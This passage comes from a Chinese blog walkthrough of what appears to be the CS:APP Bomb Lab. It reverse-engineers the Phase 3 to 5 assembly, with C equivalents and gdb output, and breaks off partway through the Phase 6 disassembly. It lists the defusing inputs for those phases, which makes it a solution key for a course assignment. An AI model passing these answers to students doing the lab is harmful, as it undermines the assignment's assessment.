400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line"> 400fcd:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>类似<code>switch</code>语句，结合上述得到的8个地址，此部分等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (passwd[<span class="number">0</span>]) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>: result = <span class="number">207</span>; <span class="keyword">break</span>;<span class="comment">// 0x400f7c</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>: result = <span class="number">311</span>; <span class="keyword">break</span>;<span class="comment">// 0x400fb9</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>: result = <span class="number">707</span>; <span class="keyword">break</span>;<span class="comment">// 0x400f83</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>: result = <span class="number">256</span>; <span class="keyword">break</span>;<span class="comment">// 0x400f8a</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>: result = <span class="number">389</span>; <span class="keyword">break</span>;<span class="comment">// 0x400f91</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">5</span>: result = <span class="number">206</span>; <span class="keyword">break</span>;<span class="comment">// 0x400f98</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">6</span>: result = <span class="number">682</span>; <span class="keyword">break</span>;<span class="comment">// 0x400f9f</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">7</span>: result = <span class="number">327</span>; <span class="keyword">break</span>;<span class="comment">// 0x400fa6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每个<code>case</code>赋值后，都跳到400fbe（400f43+0x7b）和400fc2将<code>%rsp+12</code>指向的值（输入的第2个整数）和<code>%eax</code>的值（<code>result</code>值）对比：</p>
<ul>
<li>若二者相等则跳到400fc9弹出栈并<strong>返回</strong>；</li>
<li>若二者不等则继续执行400fc4使炸弹爆炸</li>
</ul>
<p>综上得知输入的第1个整数可以有8种情况，而输入的第2个整数因第1个整数而异</p>
<hr>
<p>至此，得到<code>phase_3</code>的password为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 207</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 311</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">2 707</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3 256</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">4 389</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5 206</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">6 682</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7 327</span><br></pre></td></tr></table></figure>
<h1 id="Phase-4-recursion"><a href="#Phase-4-recursion" class="headerlink" title="Phase 4: recursion"></a>Phase 4: <em>recursion</em></h1><p><code>phase_4</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq</span><br></pre></td></tr></table></figure>
<hr>
<p>分段分析：</p>
<hr>
<p>40100c～401024与<code>phase_3</code>的400f43～400f5b相同，即<code>phase_4</code>的password同样可能是两个整数，中间以1个空格隔开，而且输入的两个整数分别存储于<code>%rsp+8</code>和<code>%rsp+12</code>两个地址中</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401029:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">...</span><br><span class="line">401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>401029和40102c判断<code>%eax</code>（<code>sscanf</code>函数的返回值）是否为2，即判断输入的是否为2个整数：</p>
<ul>
<li>不为2则跳到401035（40100c+0x29）使炸弹爆炸；</li>
<li>为2则继续执行</li>
</ul>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp)</span><br><span class="line">401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">40103a:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br></pre></td></tr></table></figure>
<p>40102e和401033判断<code>%rsp+8</code>指向的值（输入的第1个整数）是否不超过14:</p>
<ul>
<li>若超过14则继续执行401035使炸弹爆炸（由此得知<strong>输入的第1个整数范围是0～14</strong>）；</li>
<li>若不超过14则跳到40103a（40100c+0x2e）把<code>%edx</code>赋为14</li>
</ul>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40103f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi</span><br><span class="line">401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt;</span><br></pre></td></tr></table></figure>
<p>40103f把<code>%esi</code>赋为0，401044将<code>%rsp+8</code>指向的值（输入的第1个整数）给<code>%edi</code>，401048<span id = "p4">调用了<code>func4</code>函数</span>（无法推测func4函数的功能，<a href="#func4">点此分析<code>func4</code>函数</a>）</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40104d:	85 c0                	test   %eax,%eax</span><br><span class="line">40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp)</span><br><span class="line">401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">401061:	c3                   	retq </span><br></pre></td></tr></table></figure>
<p>40104d和40104f判断<code>%eax</code>的值（<code>func4</code>函数的返回值）是否为0:</p>
<ul>
<li>若不为0则跳到401058（40100c+0x4c）使炸弹爆炸（由此得知**<code>func4</code>函数的返回值必须为0**）；</li>
<li>若为0则继续执行401051和401056判断<code>%rsp+12</code>指向的值（输入的第2个整数）是否为0:<ul>
<li>若为0则跳到40105d（40100c+0x51）弹出栈并<strong>返回</strong>；</li>
<li>若不为0则继续执行401058使炸弹爆炸（由此得知<strong>输入的第2个整数必须为0</strong>）</li>
</ul>
</li>
</ul>
<hr>
<p>分析完毕，已经得知<code>phase_4</code>的password由两个整数构成，而第2个整数必为0，第一个整数是使<code>func4</code>函数返回值为0且在0～14之间的数。</p>
<p>编写C程序求第一个整数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> min = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> max = <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!func4(i, min, max))</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>即第1个整数可以是<code>0</code>、<code>1</code>、<code>3</code>或<code>7</code>。</p>
<p>至此，得到<code>phase_4</code>的password为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 0</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1 0</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">3 0</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7 0</span><br></pre></td></tr></table></figure>
<h1 id="Phase-5-pointer"><a href="#Phase-5-pointer" class="headerlink" title="Phase 5: pointer"></a>Phase 5: <em>pointer</em></h1><p><code>phase_5</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">  4010f2:	5b                   	pop    %rbx</span><br><span class="line">  4010f3:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<hr>
<p>分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401062:	53                   	push   %rbx</span><br><span class="line">401063:	48 83 ec 20          	sub    $0x20,%rsp</span><br><span class="line">...</span><br><span class="line">40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">401071:	00 00 </span><br><span class="line">401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">...</span><br><span class="line">4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">4010e5:	00 00 </span><br><span class="line">4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">4010f2:	5b                   	pop    %rbx</span><br><span class="line">4010f3:	c3                   	retq  </span><br></pre></td></tr></table></figure>
<p><span id ="stackCanacy"><code>%fs:40</code>是FS段寄存器上偏移地址<code>0x28</code>上的数据，这是一个<a href="https://stackoverflow.com/questions/10325713/why-does-this-memory-address-fs0x28-fs0x28-have-a-random-value">随机量</a>，起到<a href="https://unix.stackexchange.com/questions/453749/what-sets-fs0x28-stack-canary">stack canary</a>的作用。此部分利用stack canary确保<code>24(%rsp)</code>的数值（栈底8字节，401063）在函数调用前后不改变，若改变则执行4010e9调用<code>__stack_chk_fail</code>函数跳出，以防栈溢出（stack overflow）。</span></p>
<p>此部分与拆弹联系较弱，可以跳过。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401067:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">...</span><br><span class="line">401078:	31 c0                	xor    %eax,%eax</span><br><span class="line">40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt;</span><br></pre></td></tr></table></figure>
<p>401067将<code>%rdi</code>的地址（指向输入串）赋给<code>%rbx</code>，401078将<code>%eax</code>设为0，40107a调用<code>string_length</code>函数，返回输入串的长度<code>%eax</code></p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40107f:	83 f8 06             	cmp    $0x6,%eax</span><br><span class="line">401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">...</span><br><span class="line">4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
<p>40107f和401082判断<code>%eax</code>的值（输入串的长度）是否为6：</p>
<ul>
<li>若不为6则继续执行401084使炸弹爆炸（由此得知<strong>输入串长度必须为6</strong>）；</li>
<li>若为6则跳到4010d2（401062+0x70）将<code>%eax</code>赋为0，4010d7跳到40108b（401062+0x29）</li>
</ul>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:	88 0c 24             	mov    %cl,(%rsp)</span><br><span class="line">401092:	48 8b 14 24          	mov    (%rsp),%rdx</span><br><span class="line">401096:	83 e2 0f             	and    $0xf,%edx</span><br><span class="line">401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:	48 83 c0 01          	add    $0x1,%rax</span><br><span class="line">4010a8:	48 83 f8 06          	cmp    $0x6,%rax</span><br><span class="line">4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure>
<p>此时<code>%eax</code>为0，40108b将<code>%rbx</code>指向的值加上<code>%rax</code>的值（输入串的第<code>%rax+1</code>个字符）赋给<code>%ecx</code>，40108f将<code>%cl</code>（输入串的第<code>%rax+1</code>个字符低8位）赋给<code>%rsp</code>指向的值，401092再把<code>%rsp</code>指向的值（输入串的第<code>%rax+1</code>个字符低8位）赋给<code>%rdx</code>，401096将<code>%edx</code>（输入串的第<code>%rax+1</code>个字符低8位）和<code>0xf</code>按位取与（取低8位的低4位，结果存放于<code>%edx</code>中），401099将<code>0x4024b0</code>作为基地址、<code>%rdx</code>指向的值（取与后的值）作为偏移量，并将偏移后的值赋给<code>%edx</code>，4010a0将<code>%dl</code>（<code>%edx</code>低8位）赋给<code>%rsp+%rax+16</code>指向的值，4010a4<code>%rax</code>作为索引加1，4010a8判断<code>%rax</code>是否为6:</p>
<ul>
<li>不为6则跳到40108b（401062+0x29）循环；</li>
<li>为6则继续执行4010ae</li>
</ul>
<p>可以看出此处的循环等价于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;<span class="comment">// %eax</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i != <span class="number">6</span>; i++) &#123;<span class="comment">// %rax</span></span><br><span class="line">	ch = passwd[i];<span class="comment">// %rbx-&gt;%ecx</span></span><br><span class="line">  index = ch;<span class="comment">// %cl-&gt;%rsp-&gt;rdx</span></span><br><span class="line">  index &amp;= <span class="number">0xf</span>;<span class="comment">// %edx</span></span><br><span class="line">  ch = func[index];<span class="comment">// 0x4024b0 + index-&gt;%edx</span></span><br><span class="line">  str[i] = ch;<span class="comment">// %dl-&gt;%rsp + 16 + i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由输入串的6个字符，每个字符的低4位作为偏移量，<code>0x4024b0</code>作为基地址，最终映射生成新的<code>str</code>串</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi</span><br><span class="line">4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">4010c2:	85 c0                	test   %eax,%eax</span><br><span class="line">4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">4010d2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br></pre></td></tr></table></figure>
<p>4010ae将<code>%rsp+22</code>指向的值（<code>str[6]</code>）赋为<code>&#39;\0&#39;</code>，4010b3将地址<code>0x40245e</code>赋给<code>%esi</code>，4010b8将<code>%rsp+16</code>的地址（<code>str</code>）赋给<code>%rdi</code>，4010bd调用<code>strings_not_equal</code>函数（相等返回0，不等返回1），4010c2和4010c4判断返回值<code>%eax</code>是否为0：</p>
<ul>
<li>若不为0则继续执行4010c6使炸弹爆炸（由此得知<strong>返回值须为0</strong>，即<strong>生成的<code>str</code>串须等于<code>0x40245e</code>处的字符串</strong>）；</li>
<li>若为0则跳到4010d9（401062+0x77）继续执行则弹出栈并<strong>返回</strong></li>
</ul>
<p>直接<code>gdb</code>查看<code>0x40245e</code>处的字符串：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x40245e</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x40245e:       &quot;flyers&quot;</span><br></pre></td></tr></table></figure>
<p>即我们新生成的<code>str</code>串须为“<code>flyers</code>”</p>
<hr>
<p><code>gdb</code>查看基地址<code>0x4024b0</code>处的字符串：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x4024b0</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x4024b0 &lt;array.3449&gt;:  &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure>
<p>即基地址指向的字符串为“<code>maduiersnfotvbyl</code>”，从中找到“<code>flyers</code>”对应的下标为<code>9</code>、<code>15</code>、<code>14</code>、<code>5</code>、<code>6</code>和<code>7</code>，转换为十六进制为<code>0x9</code>、<code>0xf</code>、<code>0xe</code>、<code>0x5</code>、<code>0x6</code>和<code>0x7</code>——这就是输入串6个字符的低4位的值。</p>
<p>借助ASCII表，可以发现<code>phase_5</code>的密码并不唯一。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ASCII.png" alt="ASCII"></p>
<ul>
<li>低4位为<code>0x9</code>的字符有：<code>)</code>、<code>9</code>、<code>I</code>、<code>Y</code>、<code>i</code>、<code>y</code></li>
<li>低4位为<code>0xf</code>的字符有：<code>/</code>、<code>?</code>、<code>O</code>、<code>_</code>、<code>o</code></li>
<li>低4位为<code>0xe</code>的字符有：<code>.</code>、<code>&gt;</code>、<code>N</code>、<code>^</code>、<code>n</code>、<code>~</code></li>
<li>低4位为<code>0x5</code>的字符有：<code>%</code>、<code>5</code>、<code>E</code>、<code>U</code>、<code>e</code>、<code>u</code></li>
<li>低4位为<code>0x6</code>的字符有：<code>&amp;</code>、<code>6</code>、<code>F</code>、<code>V</code>、<code>f</code>、<code>v</code></li>
<li>低4位为<code>0x7</code>的字符有：<code>&#39;</code>、<code>7</code>、<code>G</code>、<code>W</code>、<code>g</code>、<code>w</code></li>
</ul>
<p>至此，得到<code>phase_5</code>的password为（不唯一）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">9/N567</span><br></pre></td></tr></table></figure>
<h1 id="Phase-6-link-list"><a href="#Phase-6-link-list" class="headerlink" title="Phase 6: link list"></a>Phase 6: <em>link list</em></h1><p><code>phase_6</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:	41 56                	push   %r14</span><br><span class="line">  4010f6:	41 55                	push   %r13</span><br><span class="line">  4010f8:	41 54                	push   %r12</span><br><span class="line">  4010fa:	55                   	push   %rbp</span><br><span class="line">  4010fb:	53                   	push   %rbx</span><br><span class="line">  4010fc:	48 83 ec 50          	sub    $0x50,%rsp</span><br><span class="line">  401100:	49 89 e5             	mov    %rsp,%r13</span><br><span class="line">  401103:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  401106:	e8 51 03 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  40110b:	49 89 e6             	mov    %rsp,%r14</span><br><span class="line">  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d</span><br><span class="line">  401114:	4c 89 ed             	mov    %r13,%rbp</span><br><span class="line">  401117:	41 8b 45 00          	mov    0x0(%r13),%eax</span><br><span class="line">  40111b:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line">  40111e:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">  401123:	e8 12 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401128:	41 83 c4 01          	add    $0x1,%r12d</span><br><span class="line">  40112c:	41 83 fc 06          	cmp    $0x6,%r12d</span><br><span class="line">  401130:	74 21                	je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:	44 89 e3             	mov    %r12d,%ebx</span><br><span class="line">  401135:	48 63 c3             	movslq %ebx,%rax</span><br><span class="line">  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax</span><br><span class="line">  40113b:	39 45 00             	cmp    %eax,0x0(%rbp)</span><br><span class="line">  40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:	e8 f5 02 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:	83 c3 01             	add    $0x1,%ebx</span><br><span class="line">  401148:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line">  40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:	49 83 c5 04          	add    $0x4,%r13</span><br><span class="line">  401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">  401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi</span><br><span class="line">  401158:	4c 89 f0             	mov    %r14,%rax</span><br><span class="line">  40115b:	b9 07 00 00 00       	mov    $0x7,%ecx</span><br><span class="line">  401160:	89 ca                	mov    %ecx,%edx</span><br><span class="line">  401162:	2b 10                	sub    (%rax),%edx</span><br><span class="line">  401164:	89 10                	mov    %edx,(%rax)</span><br><span class="line">  401166:	48 83 c0 04          	add    $0x4,%rax</span><br><span class="line">  40116a:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">  40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line">  40116f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">  401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx</span><br><span class="line">  40117a:	83 c0 01             	add    $0x1,%eax</span><br><span class="line">  40117d:	39 c8                	cmp    %ecx,%eax</span><br><span class="line">  40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">  401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">  40118d:	48 83 c6 04          	add    $0x4,%rsi</span><br><span class="line">  401191:	48 83 fe 18          	cmp    $0x18,%rsi</span><br><span class="line">  401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">  40119a:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line">  40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">  4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx</span><br><span class="line">  4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax</span><br><span class="line">  4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:	48 89 d9             	mov    %rbx,%rcx</span><br><span class="line">  4011bd:	48 8b 10             	mov    (%rax),%rdx</span><br><span class="line">  4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)</span><br><span class="line">  4011c4:	48 83 c0 08          	add    $0x8,%rax</span><br><span class="line">  